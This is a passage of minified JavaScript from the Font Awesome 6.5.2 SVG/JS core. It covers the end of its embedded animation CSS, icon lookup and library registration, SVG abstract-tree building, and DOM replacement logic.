    -webkit-transition-duration: 0s;
            transition-duration: 0s;
  }
}
@-webkit-keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@-webkit-keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@-webkit-keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@-webkit-keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@-webkit-keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@-webkit-keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@-webkit-keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
@keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
.fa-rotate-90 {
  -webkit-transform: rotate(90deg);
          transform: rotate(90deg);
}

.fa-rotate-180 {
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
}

.fa-rotate-270 {
  -webkit-transform: rotate(270deg);
          transform: rotate(270deg);
}

.fa-flip-horizontal {
  -webkit-transform: scale(-1, 1);
          transform: scale(-1, 1);
}

.fa-flip-vertical {
  -webkit-transform: scale(1, -1);
          transform: scale(1, -1);
}

.fa-flip-both,
.fa-flip-horizontal.fa-flip-vertical {
  -webkit-transform: scale(-1, -1);
          transform: scale(-1, -1);
}

.fa-rotate-by {
  -webkit-transform: rotate(var(--fa-rotate-angle, 0));
          transform: rotate(var(--fa-rotate-angle, 0));
}

.fa-stack {
  display: inline-block;
  vertical-align: middle;
  height: 2em;
  position: relative;
  width: 2.5em;
}

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
  z-index: var(--fa-stack-z-index, auto);
}

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1.25em;
}
.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2.5em;
}

.fa-inverse {
  color: var(--fa-inverse, #fff);
}

.sr-only,
.fa-sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.sr-only-focusable:not(:focus),
.fa-sr-only-focusable:not(:focus) {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.svg-inline--fa .fa-primary {
  fill: var(--fa-primary-color, currentColor);
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa .fa-secondary {
  fill: var(--fa-secondary-color, currentColor);
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-primary {
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-secondary {
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa mask .fa-primary,
.svg-inline--fa mask .fa-secondary {
  fill: black;
}

.fad.fa-inverse,
.fa-duotone.fa-inverse {
  color: var(--fa-inverse, #fff);
}`;

function op() {
    var e = ep,
        t = tp,
        n = I.cssPrefix,
        r = I.replacementClass,
        i = kv;
    if (n !== e || r !== t) {
        var a = new RegExp("\\.".concat(e, "\\-"), "g"),
            l = new RegExp("\\--".concat(e, "\\-"), "g"),
            o = new RegExp("\\.".concat(t), "g");
        i = i.replace(a, ".".concat(n, "-")).replace(l, "--".concat(n, "-")).replace(o, ".".concat(r))
    }
    return i
}
var rc = !1;

function ll() {
    I.autoAddCss && !rc && (hv(op()), rc = !0)
}
var xv = {
        mixout: function() {
            return {
                dom: {
                    css: op,
                    insertCss: ll
                }
            }
        },
        hooks: function() {
            return {
                beforeDOMElementCreation: function() {
                    ll()
                },
                beforeI2svg: function() {
                    ll()
                }
            }
        }
    },
    ut = Tt || {};
ut[st] || (ut[st] = {});
ut[st].styles || (ut[st].styles = {});
ut[st].hooks || (ut[st].hooks = {});
ut[st].shims || (ut[st].shims = []);
var He = ut[st],
    sp = [],
    Sv = function e() {
        W.removeEventListener("DOMContentLoaded", e), ia = 1, sp.map(function(t) {
            return t()
        })
    },
    ia = !1;
dt && (ia = (W.documentElement.doScroll ? /^loaded|^c/ : /^loaded|^i|^c/).test(W.readyState), ia || W.addEventListener("DOMContentLoaded", Sv));

function Ev(e) {
    dt && (ia ? setTimeout(e, 0) : sp.push(e))
}

function Vr(e) {
    var t = e.tag,
        n = e.attributes,
        r = n === void 0 ? {} : n,
        i = e.children,
        a = i === void 0 ? [] : i;
    return typeof e == "string" ? lp(e) : "<".concat(t, " ").concat(gv(r), ">").concat(a.map(Vr).join(""), "</").concat(t, ">")
}

function ic(e, t, n) {
    if (e && e[t] && e[t][n]) return {
        prefix: t,
        iconName: n,
        icon: e[t][n]
    }
}
var Cv = function(t, n) {
        return function(r, i, a, l) {
            return t.call(n, r, i, a, l)
        }
    },
    ol = function(t, n, r, i) {
        var a = Object.keys(t),
            l = a.length,
            o = i !== void 0 ? Cv(n, i) : n,
            s, u, f;
        for (r === void 0 ? (s = 1, f = t[a[0]]) : (s = 0, f = r); s < l; s++) u = a[s], f = o(f, t[u], u, t);
        return f
    };

function Nv(e) {
    for (var t = [], n = 0, r = e.length; n < r;) {
        var i = e.charCodeAt(n++);
        if (i >= 55296 && i <= 56319 && n < r) {
            var a = e.charCodeAt(n++);
            (a & 64512) == 56320 ? t.push(((i & 1023) << 10) + (a & 1023) + 65536) : (t.push(i), n--)
        } else t.push(i)
    }
    return t
}

function fo(e) {
    var t = Nv(e);
    return t.length === 1 ? t[0].toString(16) : null
}

function Pv(e, t) {
    var n = e.length,
        r = e.charCodeAt(t),
        i;
    return r >= 55296 && r <= 56319 && n > t + 1 && (i = e.charCodeAt(t + 1), i >= 56320 && i <= 57343) ? (r - 55296) * 1024 + i - 56320 + 65536 : r
}

function ac(e) {
    return Object.keys(e).reduce(function(t, n) {
        var r = e[n],
            i = !!r.icon;
        return i ? t[r.iconName] = r.icon : t[n] = r, t
    }, {})
}

function po(e, t) {
    var n = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {},
        r = n.skipHooks,
        i = r === void 0 ? !1 : r,
        a = ac(t);
    typeof He.hooks.addPack == "function" && !i ? He.hooks.addPack(e, ac(t)) : He.styles[e] = C(C({}, He.styles[e] || {}), a), e === "fas" && po("fa", t)
}
var hi, vi, gi, yn = He.styles,
    jv = He.shims,
    Av = (hi = {}, ne(hi, H, Object.values(Tr[H])), ne(hi, X, Object.values(Tr[X])), hi),
    Ps = null,
    up = {},
    cp = {},
    fp = {},
    dp = {},
    pp = {},
    Iv = (vi = {}, ne(vi, H, Object.keys(Or[H])), ne(vi, X, Object.keys(Or[X])), vi);

function Ov(e) {
    return ~cv.indexOf(e)
}

function bv(e, t) {
    var n = t.split("-"),
        r = n[0],
        i = n.slice(1).join("-");
    return r === e && i !== "" && !Ov(i) ? i : null
}
var mp = function() {
    var t = function(a) {
        return ol(yn, function(l, o, s) {
            return l[s] = ol(o, a, {}), l
        }, {})
    };
    up = t(function(i, a, l) {
        if (a[3] && (i[a[3]] = l), a[2]) {
            var o = a[2].filter(function(s) {
                return typeof s == "number"
            });
            o.forEach(function(s) {
                i[s.toString(16)] = l
            })
        }
        return i
    }), cp = t(function(i, a, l) {
        if (i[l] = l, a[2]) {
            var o = a[2].filter(function(s) {
                return typeof s == "string"
            });
            o.forEach(function(s) {
                i[s] = l
            })
        }
        return i
    }), pp = t(function(i, a, l) {
        var o = a[2];
        return i[l] = l, o.forEach(function(s) {
            i[s] = l
        }), i
    });
    var n = "far" in yn || I.autoFetchSvg,
        r = ol(jv, function(i, a) {
            var l = a[0],
                o = a[1],
                s = a[2];
            return o === "far" && !n && (o = "fas"), typeof l == "string" && (i.names[l] = {
                prefix: o,
                iconName: s
            }), typeof l == "number" && (i.unicodes[l.toString(16)] = {
                prefix: o,
                iconName: s
            }), i
        }, {
            names: {},
            unicodes: {}
        });
    fp = r.names, dp = r.unicodes, Ps = Aa(I.styleDefault, {
        family: I.familyDefault
    })
};
mv(function(e) {
    Ps = Aa(e.styleDefault, {
        family: I.familyDefault
    })
});
mp();

function js(e, t) {
    return (up[e] || {})[t]
}

function Tv(e, t) {
    return (cp[e] || {})[t]
}

function Yt(e, t) {
    return (pp[e] || {})[t]
}

function hp(e) {
    return fp[e] || {
        prefix: null,
        iconName: null
    }
}

function zv(e) {
    var t = dp[e],
        n = js("fas", e);
    return t || (n ? {
        prefix: "fas",
        iconName: n
    } : null) || {
        prefix: null,
        iconName: null
    }
}

function zt() {
    return Ps
}
var As = function() {
    return {
        prefix: null,
        iconName: null,
        rest: []
    }
};

function Aa(e) {
    var t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
        n = t.family,
        r = n === void 0 ? H : n,
        i = Or[r][e],
        a = br[r][e] || br[r][i],
        l = e in He.styles ? e : null;
    return a || l || null
}
var lc = (gi = {}, ne(gi, H, Object.keys(Tr[H])), ne(gi, X, Object.keys(Tr[X])), gi);

function Ia(e) {
    var t, n = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
        r = n.skipLookups,
        i = r === void 0 ? !1 : r,
        a = (t = {}, ne(t, H, "".concat(I.cssPrefix, "-").concat(H)), ne(t, X, "".concat(I.cssPrefix, "-").concat(X)), t),
        l = null,
        o = H;
    (e.includes(a[H]) || e.some(function(u) {
        return lc[H].includes(u)
    })) && (o = H), (e.includes(a[X]) || e.some(function(u) {
        return lc[X].includes(u)
    })) && (o = X);
    var s = e.reduce(function(u, f) {
        var m = bv(I.cssPrefix, f);
        if (yn[f] ? (f = Av[o].includes(f) ? iv[o][f] : f, l = f, u.prefix = f) : Iv[o].indexOf(f) > -1 ? (l = f, u.prefix = Aa(f, {
                family: o
            })) : m ? u.iconName = m : f !== I.replacementClass && f !== a[H] && f !== a[X] && u.rest.push(f), !i && u.prefix && u.iconName) {
            var v = l === "fa" ? hp(u.iconName) : {},
                g = Yt(u.prefix, u.iconName);
            v.prefix && (l = null), u.iconName = v.iconName || g || u.iconName, u.prefix = v.prefix || u.prefix, u.prefix === "far" && !yn.far && yn.fas && !I.autoFetchSvg && (u.prefix = "fas")
        }
        return u
    }, As());
    return (e.includes("fa-brands") || e.includes("fab")) && (s.prefix = "fab"), (e.includes("fa-duotone") || e.includes("fad")) && (s.prefix = "fad"), !s.prefix && o === X && (yn.fass || I.autoFetchSvg) && (s.prefix = "fass", s.iconName = Yt(s.prefix, s.iconName) || s.iconName), (s.prefix === "fa" || l === "fa") && (s.prefix = zt() || "fas"), s
}
var Lv = function() {
        function e() {
            Y1(this, e), this.definitions = {}
        }
        return K1(e, [{
            key: "add",
            value: function() {
                for (var n = this, r = arguments.length, i = new Array(r), a = 0; a < r; a++) i[a] = arguments[a];
                var l = i.reduce(this._pullDefinitions, {});
                Object.keys(l).forEach(function(o) {
                    n.definitions[o] = C(C({}, n.definitions[o] || {}), l[o]), po(o, l[o]);
                    var s = Tr[H][o];
                    s && po(s, l[o]), mp()
                })
            }
        }, {
            key: "reset",
            value: function() {
                this.definitions = {}
            }
        }, {
            key: "_pullDefinitions",
            value: function(n, r) {
                var i = r.prefix && r.iconName && r.icon ? {
                    0: r
                } : r;
                return Object.keys(i).map(function(a) {
                    var l = i[a],
                        o = l.prefix,
                        s = l.iconName,
                        u = l.icon,
                        f = u[2];
                    n[o] || (n[o] = {}), f.length > 0 && f.forEach(function(m) {
                        typeof m == "string" && (n[o][m] = u)
                    }), n[o][s] = u
                }), n
            }
        }]), e
    }(),
    oc = [],
    wn = {},
    An = {},
    Rv = Object.keys(An);

function Mv(e, t) {
    var n = t.mixoutsTo;
    return oc = e, wn = {}, Object.keys(An).forEach(function(r) {
        Rv.indexOf(r) === -1 && delete An[r]
    }), oc.forEach(function(r) {
        var i = r.mixout ? r.mixout() : {};
        if (Object.keys(i).forEach(function(l) {
                typeof i[l] == "function" && (n[l] = i[l]), ra(i[l]) === "object" && Object.keys(i[l]).forEach(function(o) {
                    n[l] || (n[l] = {}), n[l][o] = i[l][o]
                })
            }), r.hooks) {
            var a = r.hooks();
            Object.keys(a).forEach(function(l) {
                wn[l] || (wn[l] = []), wn[l].push(a[l])
            })
        }
        r.provides && r.provides(An)
    }), n
}

function mo(e, t) {
    for (var n = arguments.length, r = new Array(n > 2 ? n - 2 : 0), i = 2; i < n; i++) r[i - 2] = arguments[i];
    var a = wn[e] || [];
    return a.forEach(function(l) {
        t = l.apply(null, [t].concat(r))
    }), t
}

function tn(e) {
    for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
    var i = wn[e] || [];
    i.forEach(function(a) {
        a.apply(null, n)
    })
}

function ct() {
    var e = arguments[0],
        t = Array.prototype.slice.call(arguments, 1);
    return An[e] ? An[e].apply(null, t) : void 0
}

function ho(e) {
    e.prefix === "fa" && (e.prefix = "fas");
    var t = e.iconName,
        n = e.prefix || zt();
    if (t) return t = Yt(n, t) || t, ic(vp.definitions, n, t) || ic(He.styles, n, t)
}
var vp = new Lv,
    Dv = function() {
        I.autoReplaceSvg = !1, I.observeMutations = !1, tn("noAuto")
    },
    Fv = {
        i2svg: function() {
            var t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
            return dt ? (tn("beforeI2svg", t), ct("pseudoElements2svg", t), ct("i2svg", t)) : Promise.reject("Operation requires a DOM of some kind.")
        },
        watch: function() {
            var t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
                n = t.autoReplaceSvgRoot;
            I.autoReplaceSvg === !1 && (I.autoReplaceSvg = !0), I.observeMutations = !0, Ev(function() {
                Uv({
                    autoReplaceSvgRoot: n
                }), tn("watch", t)
            })
        }
    },
    _v = {
        icon: function(t) {
            if (t === null) return null;
            if (ra(t) === "object" && t.prefix && t.iconName) return {
                prefix: t.prefix,
                iconName: Yt(t.prefix, t.iconName) || t.iconName
            };
            if (Array.isArray(t) && t.length === 2) {
                var n = t[1].indexOf("fa-") === 0 ? t[1].slice(3) : t[1],
                    r = Aa(t[0]);
                return {
                    prefix: r,
                    iconName: Yt(r, n) || n
                }
            }
            if (typeof t == "string" && (t.indexOf("".concat(I.cssPrefix, "-")) > -1 || t.match(av))) {
                var i = Ia(t.split(" "), {
                    skipLookups: !0
                });
                return {
                    prefix: i.prefix || zt(),
                    iconName: Yt(i.prefix, i.iconName) || i.iconName
                }
            }
            if (typeof t == "string") {
                var a = zt();
                return {
                    prefix: a,
                    iconName: Yt(a, t) || t
                }
            }
        }
    },
    Oe = {
        noAuto: Dv,
        config: I,
        dom: Fv,
        parse: _v,
        library: vp,
        findIconDefinition: ho,
        toHtml: Vr
    },
    Uv = function() {
        var t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
            n = t.autoReplaceSvgRoot,
            r = n === void 0 ? W : n;
        (Object.keys(He.styles).length > 0 || I.autoFetchSvg) && dt && I.autoReplaceSvg && Oe.dom.i2svg({
            node: r
        })
    };

function Oa(e, t) {
    return Object.defineProperty(e, "abstract", {
        get: t
    }), Object.defineProperty(e, "html", {
        get: function() {
            return e.abstract.map(function(r) {
                return Vr(r)
            })
        }
    }), Object.defineProperty(e, "node", {
        get: function() {
            if (dt) {
                var r = W.createElement("div");
                return r.innerHTML = e.html, r.children
            }
        }
    }), e
}

function Bv(e) {
    var t = e.children,
        n = e.main,
        r = e.mask,
        i = e.attributes,
        a = e.styles,
        l = e.transform;
    if (Ns(l) && n.found && !r.found) {
        var o = n.width,
            s = n.height,
            u = {
                x: o / s / 2,
                y: .5
            };
        i.style = ja(C(C({}, a), {}, {
            "transform-origin": "".concat(u.x + l.x / 16, "em ").concat(u.y + l.y / 16, "em")
        }))
    }
    return [{
        tag: "svg",
        attributes: i,
        children: t
    }]
}

function Hv(e) {
    var t = e.prefix,
        n = e.iconName,
        r = e.children,
        i = e.attributes,
        a = e.symbol,
        l = a === !0 ? "".concat(t, "-").concat(I.cssPrefix, "-").concat(n) : a;
    return [{
        tag: "svg",
        attributes: {
            style: "display: none;"
        },
        children: [{
            tag: "symbol",
            attributes: C(C({}, i), {}, {
                id: l
            }),
            children: r
        }]
    }]
}

function Is(e) {
    var t = e.icons,
        n = t.main,
        r = t.mask,
        i = e.prefix,
        a = e.iconName,
        l = e.transform,
        o = e.symbol,
        s = e.title,
        u = e.maskId,
        f = e.titleId,
        m = e.extra,
        v = e.watchable,
        g = v === void 0 ? !1 : v,
        w = r.found ? r : n,
        k = w.width,
        E = w.height,
        p = i === "fak",
        c = [I.replacementClass, a ? "".concat(I.cssPrefix, "-").concat(a) : ""].filter(function(F) {
            return m.classes.indexOf(F) === -1
        }).filter(function(F) {
            return F !== "" || !!F
        }).concat(m.classes).join(" "),
        h = {
            children: [],
            attributes: C(C({}, m.attributes), {}, {
                "data-prefix": i,
                "data-icon": a,
                class: c,
                role: m.attributes.role || "img",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 ".concat(k, " ").concat(E)
            })
        },
        y = p && !~m.classes.indexOf("fa-fw") ? {
            width: "".concat(k / E * 16 * .0625, "em")
        } : {};
    g && (h.attributes[en] = ""), s && (h.children.push({
        tag: "title",
        attributes: {
            id: h.attributes["aria-labelledby"] || "title-".concat(f || Lr())
        },
        children: [s]
    }), delete h.attributes.title);
    var S = C(C({}, h), {}, {
            prefix: i,
            iconName: a,
            main: n,
            mask: r,
            maskId: u,
            transform: l,
            symbol: o,
            styles: C(C({}, y), m.styles)
        }),
        P = r.found && n.found ? ct("generateAbstractMask", S) || {
            children: [],
            attributes: {}
        } : ct("generateAbstractIcon", S) || {
            children: [],
            attributes: {}
        },
        j = P.children,
        O = P.attributes;
    return S.children = j, S.attributes = O, o ? Hv(S) : Bv(S)
}

function sc(e) {
    var t = e.content,
        n = e.width,
        r = e.height,
        i = e.transform,
        a = e.title,
        l = e.extra,
        o = e.watchable,
        s = o === void 0 ? !1 : o,
        u = C(C(C({}, l.attributes), a ? {
            title: a
        } : {}), {}, {
            class: l.classes.join(" ")
        });
    s && (u[en] = "");
    var f = C({}, l.styles);
    Ns(i) && (f.transform = wv({
        transform: i,
        startCentered: !0,
        width: n,
        height: r
    }), f["-webkit-transform"] = f.transform);
    var m = ja(f);
    m.length > 0 && (u.style = m);
    var v = [];
    return v.push({
        tag: "span",
        attributes: u,
        children: [t]
    }), a && v.push({
        tag: "span",
        attributes: {
            class: "sr-only"
        },
        children: [a]
    }), v
}

function Vv(e) {
    var t = e.content,
        n = e.title,
        r = e.extra,
        i = C(C(C({}, r.attributes), n ? {
            title: n
        } : {}), {}, {
            class: r.classes.join(" ")
        }),
        a = ja(r.styles);
    a.length > 0 && (i.style = a);
    var l = [];
    return l.push({
        tag: "span",
        attributes: i,
        children: [t]
    }), n && l.push({
        tag: "span",
        attributes: {
            class: "sr-only"
        },
        children: [n]
    }), l
}
var sl = He.styles;

function vo(e) {
    var t = e[0],
        n = e[1],
        r = e.slice(4),
        i = ws(r, 1),
        a = i[0],
        l = null;
    return Array.isArray(a) ? l = {
        tag: "g",
        attributes: {
            class: "".concat(I.cssPrefix, "-").concat(Qt.GROUP)
        },
        children: [{
            tag: "path",
            attributes: {
                class: "".concat(I.cssPrefix, "-").concat(Qt.SECONDARY),
                fill: "currentColor",
                d: a[0]
            }
        }, {
            tag: "path",
            attributes: {
                class: "".concat(I.cssPrefix, "-").concat(Qt.PRIMARY),
                fill: "currentColor",
                d: a[1]
            }
        }]
    } : l = {
        tag: "path",
        attributes: {
            fill: "currentColor",
            d: a
        }
    }, {
        found: !0,
        width: t,
        height: n,
        icon: l
    }
}
var Wv = {
    found: !1,
    width: 512,
    height: 512
};

function Qv(e, t) {
    !np && !I.showMissingIcons && e && console.error('Icon with name "'.concat(e, '" and prefix "').concat(t, '" is missing.'))
}

function go(e, t) {
    var n = t;
    return t === "fa" && I.styleDefault !== null && (t = zt()), new Promise(function(r, i) {
        if (ct("missingIconAbstract"), n === "fa") {
            var a = hp(e) || {};
            e = a.iconName || e, t = a.prefix || t
        }
        if (e && t && sl[t] && sl[t][e]) {
            var l = sl[t][e];
            return r(vo(l))
        }
        Qv(e, t), r(C(C({}, Wv), {}, {
            icon: I.showMissingIcons && e ? ct("missingIconAbstract") || {} : {}
        }))
    })
}
var uc = function() {},
    yo = I.measurePerformance && ui && ui.mark && ui.measure ? ui : {
        mark: uc,
        measure: uc
    },
    tr = 'FA "6.5.2"',
    Yv = function(t) {
        return yo.mark("".concat(tr, " ").concat(t, " begins")),
            function() {
                return gp(t)
            }
    },
    gp = function(t) {
        yo.mark("".concat(tr, " ").concat(t, " ends")), yo.measure("".concat(tr, " ").concat(t), "".concat(tr, " ").concat(t, " begins"), "".concat(tr, " ").concat(t, " ends"))
    },
    Os = {
        begin: Yv,
        end: gp
    },
    Oi = function() {};

function cc(e) {
    var t = e.getAttribute ? e.getAttribute(en) : null;
    return typeof t == "string"
}

function Kv(e) {
    var t = e.getAttribute ? e.getAttribute(xs) : null,
        n = e.getAttribute ? e.getAttribute(Ss) : null;
    return t && n
}

function Gv(e) {
    return e && e.classList && e.classList.contains && e.classList.contains(I.replacementClass)
}

function Zv() {
    if (I.autoReplaceSvg === !0) return bi.replace;
    var e = bi[I.autoReplaceSvg];
    return e || bi.replace
}

function Xv(e) {
    return W.createElementNS("http://www.w3.org/2000/svg", e)
}

function Jv(e) {
    return W.createElement(e)
}

function yp(e) {
    var t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
        n = t.ceFn,
        r = n === void 0 ? e.tag === "svg" ? Xv : Jv : n;
    if (typeof e == "string") return W.createTextNode(e);
    var i = r(e.tag);
    Object.keys(e.attributes || []).forEach(function(l) {
        i.setAttribute(l, e.attributes[l])
    });
    var a = e.children || [];
    return a.forEach(function(l) {
        i.appendChild(yp(l, {
            ceFn: r
        }))
    }), i
}

function qv(e) {
    var t = " ".concat(e.outerHTML, " ");
    return t = "".concat(t, "Font Awesome fontawesome.com "), t
}
var bi = {
    replace: function(t) {
        var n = t[0];
        if (n.parentNode)
            if (t[1].forEach(function(i) {
                    n.parentNode.insertBefore(yp(i), n)
                }), n.getAttribute(en) === null && I.keepOriginalSource) {
                var r = W.createComment(qv(n));
                n.parentNode.replaceChild(r, n)
            } else n.remove()
    },
    nest: function(t) {
        var n = t[0],
            r = t[1];
        if (~Cs(n).indexOf(I.replacementClass)) return bi.replace(t);
        var i = new RegExp("".concat(I.cssPrefix, "-.*"));
        if (delete r[0].attributes.id, r[0].attributes.class) {
            var a = r[0].attributes.class.split(" ").reduce(function(o, s) {
                return s === I.replacementClass || s.match(i) ? o.toSvg.push(s) : o.toNode.push(s), o
            }, {
                toNode: [],
                toSvg: []
            });
            r[0].attributes.class = a.toSvg.join(" "), a.toNode.length === 0 ? n.removeAttribute("class") : n.setAttribute("class", a.toNode.join(" "))
        }
        var l = r.map(function(o) {
            return Vr(o)
        }).join(`
`);
        n.setAttribute(en, ""), n.innerHTML = l
    }
};

function fc(e) {
    e()
}

function wp(e, t) {
    var n = typeof t == "function" ? t : Oi;
    if (e.length === 0) n();
    else {
        var r = fc;
        I.mutateApproach === nv && (r = Tt.requestAnimationFrame || fc), r(function() {
            var i = Zv(),
                a = Os.begin("mutate");
            e.map(i), a(), n()
        })
    }
}
var bs = !1;

function kp() {
    bs = !0
}

function wo() {
    bs = !1
}
var aa = null;

function dc(e) {
    if (tc && I.observeMutations) {
        var t = e.treeCallback,
            n = t === void 0 ? Oi : t,
            r = e.nodeCallback,
            i = r === void 0 ? Oi : r,
            a = e.pseudoElementsCallback,
            l = a === void 0 ? Oi : a,
            o = e.observeMutationsRoot,
            s = o === void 0 ? W : o;
        aa = new tc(function(u) {
            if (!bs) {
                var f = zt();
